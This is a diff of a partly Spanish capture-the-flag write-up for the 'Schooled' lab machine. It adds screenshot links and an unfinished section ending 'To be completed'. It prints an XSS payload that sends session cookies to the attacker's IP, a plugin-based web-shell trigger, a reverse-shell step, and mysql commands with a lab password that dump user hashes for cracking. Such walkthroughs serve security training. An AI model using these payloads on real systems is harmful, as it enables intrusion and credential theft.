@@ -1,5 +1,5 @@
 # Schooled Writeup
-![Schooled]()
+![Schooled](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/schooled.htb.PNG)
 
 **Keyword summary:**
 - VHost Brute Force
@@ -25,7 +25,7 @@ We will see that the open ports are:
 - 80/tcp | http
 - 33060/tcp | mysqlx
 
-![Puertos]()
+![Puertos](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Ports.PNG)
 
 now we can do para obtener un poco mas de información sobre los puertos abiertos de la IP Objetivo:
 ```bash
@@ -46,7 +46,7 @@ whatweb [IP]
 ```bash
 nmap --script http-enum -p80 [IP]
 ```
-![whatweb&scriptnmap]()
+![whatweb&scriptnmap](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/whatweb%26scriptnmap.PNG)
 
 
 De esta forma podemos ver que el sitio web en primer lugar es un FreeBSD y además podemos observar lo que parece ser un correo electronico **"admissions@schooled.htb"** Lo que nos puede interesar acerca de esto es que contamos con un dominio ```"schooled.htb"```. 
@@ -65,12 +65,12 @@ Añadiremos en el archivo "/etc/hosts" el dominio que encontramos anteriormente.
 
 Ingresemos al sitio nuevamente haciendo uso de este dominio
 
-![webSchooled.htb]()
+![webSchooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/webSchooled.htb.PNG)
 
 Y en este caso, pues el contenido de la pagina web es exactamente el mismo.
 Así que explorando un poco más la pagina, en el apartado "teachers" podemos ver profesores que hacen parte de la institución educativa y su respectivo rol en esta. 
 
-![teachers]()
+![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)
 De esta forma podemos ver que como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager
 
 # Moodle
@@ -80,46 +80,47 @@ Lo que podemos hacer ahora en busqueda de mas información sobre el sitio web es
 ```bash
 gobuster vhost -u http://schooled.htb -w [wordlistPATH] -t 64 --apend-domain
 ```
-![subdominio]()
+![subdominio](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/subdominio.PNG)
 
 gobuster encontró como subdominio existente en el sitio web **"moodle.schooled.htb"**
 Así que vamos a agregar este subdominio en nuestro archivo "/etc/hosts"
 
-![moodle.schooled.htb]()
+![moodle.schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodle.schooled.htb.PNG)
 
 **¿Que es Moodle?** [https://es.wikipedia.org/wiki/Moodle]
 
-![paginamoodle]()
+![paginamoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/paginamoodle.PNG)
 Efectivamente, el sitio web cuenta con un subdominio en el que podemos ver un Moodle que hace parte de la institución educativa
 
 Así que creemos una cuenta nueva y entremos al moodle
 
 Algo curioso es que al intentar registrarme en el Moodle, al colocar un correo electronico es requisito que este pertenezca al dominio **"student.schooled.htb"**
-![emailleakinfo]()
+![emailleakinfo](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/emailleakinfo.PNG)
 
 (Al incorporar este subdominio en el archivo /etc/hosts nos lleva a la misma pagina inicial)
 
 Una vez creada la cuenta nos encontraremos con esto:
 
-![moodledashboard]()
+![moodledashboard](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledashboard.PNG)
 
 Si nos dirigimos al apartado de "site home" encontraremos una serie de cursos que se ofrecen en la institución educativa. Revisando cada uno de los cursos podremos ver que solo podemos auto-inscribirnos en el curso de "Mathematics" que dirige el profesor "Manuel Phillips". Así que nos inscribiremos.
 # Moodle Foothold
 ****
-![Announcements]()
-![reminder]()
+![Announcements](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Announcements.PNG)
+![reminder](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reminder.PNG)
+
 En la sección "Announcements" del curso "Mathematics" en el que nos inscribimos, podemos ver el anuncio "Reminder for joining students". En este, el profesor nos indica that we need to set our ```"MoodleNet profile"``` y que estara revisando los perfiles de los estudiantes inscritos para verificar que el estudiante haya configurado este campo.
 
 Por lo tanto, yendo a los ajustes del perfil de Moodle podemos ver el campo ```"MoodleNet profile"```
-![moodlenet]()
+![moodlenet](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlenet.PNG)
 
 **Pero... ¿que tipo de información debe ir en este campo?**
 Bueno, intentemos escribiendo una palabra de test
 
-![test]()
+![test](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/test.PNG)
 Vemos que en nuestro perfil de moodle se muestra:
 
-![showingtest]()
+![showingtest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showingtest.PNG)
 
 De esta forma, lo que podemos probar como atacantes es verificar si el campo ```"MoodleNet profile"``` es vulnerable a XSS (Cross-Site Scripting)
 **¿Que es Cross-Site Scripting?** [https://www.welivesecurity.com/la-es/2021/09/28/que-es-ataque-xss-cross-site-scripting/]
@@ -130,7 +131,7 @@ Entonces, lo que haremos es inyectar en el campo ```"MoodleNet profile"``` a tes
 ```
 De esta forma, si actualizamos los cambios realizados en el perfil de Moodle y sí efectivamente el campo ```"MoodleNet profile"``` es vulnerable a **XSS**, al entrar a nuestro perfil de Moodle nos saldra una pequeña ventana emergente
 
-![XSSTest]()
+![XSSTest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/XSSTest.PNG)
 
 Perfecto!
 ### Exploiting XSS Vulnerabilities for Session Cookie Stealing
@@ -140,18 +141,18 @@ Para esto, utilizaremos el siguiente comando para establecer un servidor web sim
 ```python
 python3 -m http.server 80
 ```
-![python3sever]()
+![python3sever](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/python3sever.PNG)
 Ahora inyectaremos en el campo ```"MoodleNet profile"``` el siguiente payload que se encargara de robar la cookie de sesión del usuario que ingrese a nuestro perfil de Moodle 
 
 ```sh
 <script>var i=new Image(); i.src="http://[OurIP]/?cookie="+btoa(document.cookie);</script>
 ```
-![cookie]()
+![cookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookie.PNG)
 
 Podemos ver como se envia a nuestro servidor la cookie de sesión del profesor "Manuel Phillips"
 Sin embargo, esta cookie se encuentra codificada en base64, asi que tenemos que decodificarla:
 
-![stealingcookie]()
+![stealingcookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/stealingcookie.PNG)
 base6
 
 ```bash
@@ -159,17 +160,17 @@ MoodleSession=lan2a2hc9ub9qhkhdful6mnff2
 ```
 Ahora que contamos con la cookie de sesion del profesor, podemos autenticarnos como el profesor
 
-![cookieantes]()
+![cookieantes](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookieantes.PNG)
 
-![cookiedespues]()
+![cookiedespues](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookiedespues.PNG)
 
 Perfecto!
 
-![Impersonification]()
+![Impersonification](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Impersonification.PNG)
 
 Podemos ver como en la parte superior derecha se nos muestra que estamos dentro del sistema como el usuario **"Manuel Phillips"**
 
-![Perfilprofe]()
+![Perfilprofe](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/perfilprofe.PNG)
 
 Revisando el perfil del profesor, podemos ver que su correo pertenece a un dominio distinto, podemos probar si este dominio se encuentra como un subdominio del sitio web de la institución educativa. Sin embargo, este subdominio nos redirige a la misma pagina inicial.
 
@@ -183,7 +184,7 @@ Existe un archivo que nos permite ver hasta la fecha en que versión de Moodle n
 
 ``` theme/upgrade.txt ```
 Así que la podemos colocar en el navegador y consultar el archivo "upgrade.txt"
-![versionmoodle]()
+![versionmoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/versionmoodle.PNG)
 
 Así, parece ser que la **versión de Moodle que esta corriendo en el servidor es la "3.9"**
 
@@ -195,13 +196,13 @@ searchsploit Moodle 3.9
 Podemos ver un exploit titulado como:
 >Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)
 
-![searchsploit]()
+![searchsploit](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/searchsploit.PNG)
 
 ```bash
 searchsploit -x 50180
 ```
 
-![exploitanalisis]()
+![exploitanalisis](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/exploitanalisis.PNG)
 
 Analizando un poco la estructura del exploit poodemos ver que lo que parece que esté intenta hacer es autenticarnos como manager y luego intentar aumentar los privilegios de la manager account para tener la capacidad de instalar plugins sobre el sistema
 
@@ -209,10 +210,10 @@ _At this point we could directly use the exploit and complete the machine eventu
 
 Es importante mencionar que Moodle cuenta con un apartado de "Security Announcements", por lo que nos interesa saber de que fecha data la versión 3.9 de Moodle
 
-![moodledate]()
+![moodledate](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledate.PNG)
 
 Así, en la pagina [https://moodle.org/security/] podemos consultar por la fecha de la versión 3.9 de Moodle
-![moodlevuln]()
+![moodlevuln](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlevuln.PNG)
 
 Así, podemos ver que existe una vulnerabilidad sobre esta versión de Moodle identificada como: **CVE-2020-14321**
 en la que podemos escalar privilegios a "manager role" partiendo desde un usuario de "Teacher". La vulnerabilidad funciona mediante la explotación de un "Mass Assignment Attack"
@@ -227,16 +228,16 @@ Partiendo del hecho de que nos encontramos autenticados as the Manuel Phillips T
 
 **En este punto quiero que recordemos que contabamos con la información de que profesores se encontraban adscritos a la institución educativa**
 
-![teachers]()
+![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)
 
 y como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager.
 Así que intentemos añadir al usuario "Lianne Carter" al curso de matematicas
 
-![Agregaralcurso]()
+![Agregaralcurso](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregaralcurso.PNG)
 
 El usuario "Lianne Carter" ha sido exitosanente inscrita en el curso de matematicas
 
-![Agregada]()
+![Agregada](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregada.PNG)
 
 Entonces, vamos a eliminar a este usuario de la lista de participantes del curso y analicemos con **Burpsuite** que ocurre cuando se envia la petición al agregar al usuario "Lianne Carter" al curso.
 
@@ -253,7 +254,7 @@ Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 11 Cookie: Moodle
 ```
 `(Request Query parameters | From the request intercepted by Burpsuite)`
 
-![burpsuite]()
+![burpsuite](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuite.PNG)
 
 ```Es importante que la peticion interceptada por Burpsuite la enviemos al Repeater, allí haremos cambios y enviaremos la petición```
 
@@ -263,11 +264,11 @@ Podemos observar que la solicitud pasa dos parametros de interes:
 
 - **userlist%5B%5D**
 Para revisar la lista de usuarios en el sistema, podemos darnos cuenta que si consultamos nuestro perfil de Moodle (Que en este momento corresponde al del usuario Manuel Phillips). Podemos ver que en la barra del buscador la **"id"** del perfil corresponde a aquella identificada con el numero "24"
-![profileid]()
+![profileid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/profileid.PNG)
 
 Si cambiamos este valor en nuestro buscador, por el numero "25" 
 
-![Lianncarterid]()
+![Lianncarterid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Lianncarterid.PNG)
 
 Se nos redirige al perfil del usuario "Liann Carter" en Moodle 
 
@@ -296,41 +297,41 @@ when you drop the intercepted request, the user "Lianne Carter" will not be adde
 
 Once in the profile of "Lianne Carter" we will be able to notice that we have the privileges of **Log in as Lianne Carter**.
 
-![privilegiosLianne]()
+![privilegiosLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/privilegiosLianne.PNG)
 
 Nice!
 
-![logueado]()
+![logueado](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/logueado.PNG)
 
 Esto es una implementación con la que cuenta Moodle, nos encontramos autenticados como Manuel Phillips but logged in as Lianne Carter
 
-![manuelLianne]()
+![manuelLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/manuelLianne.PNG)
 
 
 Ahora, logged in as this user, we will have access to a "Site administration" panel
 
-![Site_administration]()
+![Site_administration](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Site_administration.PNG)
 
 **En Moodle una de las principales formas que hay para lograr inyectar comandos suele ser el panel de Plugins, sin embargo, a pesar de estar autenticados como Liann Carter, parece que no tenemos privilegios para subir Plugins al sistema**
 
-![pluginsoff]()
+![pluginsoff](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginsoff.PNG)
 
 # Mass Assignment Attack 
 ****
 En el apartado "Users" podemos ver una sección "Permissions" 
 
-![permissions]()
+![permissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/permissions.PNG)
 
 allí ingresaremos a "Define roles"
 
-![listapermissions]()
+![listapermissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/listapermissions.PNG)
 
 Si damos click a "Manager" parece que tenemos un listado extenso de todo aquello que "Manager" role tiene permitido en Moodle y todo aquello que "Manager" role no tiene permitido en Moodle.
 
 **¿Que se nos puede ocurrir?** un **Mass Assignment Attack** 
 Así que vamos dar click en "Edit", activaremos **Burpsuite** and we will "Save Changes" para interceptar la petición
 
-![burpsuitemass]()
+![burpsuitemass](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuitemass.PNG)
 
 Lo que vemos en Burpsuite son aquellos permisos y su valor con los que actualmente cuenta el usuario "Lianne Carter" en el sistema.
 
@@ -339,6 +340,96 @@ Aqui, en la sección "Payload to full permissions" parece explotarse un Mass Ass
 
 Ahora, verificaremos que tengamos los privilegios para subir Plugins al sistema
 
-![pluginson]()
+![pluginson](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginson.PNG)
+
+
+Now, from the same Github repository above, we can download the zip file that is uploaded as a plugin to Moodle [https://github.com/HoangKien1020/Moodle_RCE]
+
+![zipupload](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/zipupload.PNG)
+
+![zipconfirmed](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/zipconfirmed.PNG)
+
+Trigger RCE
+>moodle/blocks/rce/lang/en/block_rce.php?cmd=id
+
+So that is the Path that we will have to write in our web browser to execute commands
+
+![RCE](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/RCE.PNG)
+
+## Reverse Shell 
+****
+
+Now, what we want to do is to send a **reverse shell** to our system
+
+so with netcat we are going to establish a listening port, in my case I will do it on port "4444" and we will inject through the plugin the following command
+
+![reverse](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reverse.PNG)
+
+- %26 = &
+
+We have to URL-Encode the "&" because the system might not interpret the command.
+
+Enumerating the system a bit in the path /usr/local/www/apache24/data/moodle
+
+We will find a file "config.php"
+Containing database login credentials
+![config](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/config.PNG)
+
+
+[[[Aqui explicar pq razón mysql no puede ser usado en el sistema y se debe sobreescribir el $PATH con nuestro $PATH por ejemplo]]]
+
+una vez hecho eso:
+
+
+```bash
+mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
+```
+Aqui debe usarse la flag -e para ejecutar comandos sin entrar a un "mysql" interactivo, partiendo desde que no se cuenta con una consola interactiva en la reverse shell lo cual nos dara problemas para ejecutar comandos interactivos :/
+
+```bash
+mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
+```
+
+![showdatabases]()
+
+```bash
+mysql -umoodle -pPlaybookMaster2020 -e 'show tables' moodle
+```
+
+![showtables]()
+
+```bash
+mysql -umoodle -pPlaybookMaster2020 -e 'describe mdl_user' moodle
+```
+
+![columns]()
+
+Aqui las columnas de interes serian username | password | email
+
+
+```bash
+mysql -umoodle -pPlaybookMaster2020 -e 'select username,password,email from mdl_user' moodle
+```
+
+![credenciales]()
+![home]()
+De todas estas nos interesan aquellas de "jamie" y "steve" ya que son los usuarios que cuentan con un directorio en /home/
+
+además de que Jamie es Admin y pues steve no esta 
+
+Si rompemos el hash y pensamos en que podria estarse reutilizando la clave del usuario Jamie, podriamos ingresar por ssh al sistema
+Podemos romper el hash utilizando herrramientas como hashcat y reconociendo el formato con el que esta encriptada la contraseña
+Esto lo podemos hacer asi:
+
+[[[Explicar como aproximadamente reconocer hashes]]]
+
+
+![hash]()
+
+entonces logramos obtener utilizando hashcat 
+De esta forma la contraseña del usuario Jamie es:
+
+
+To be completed...
 
 
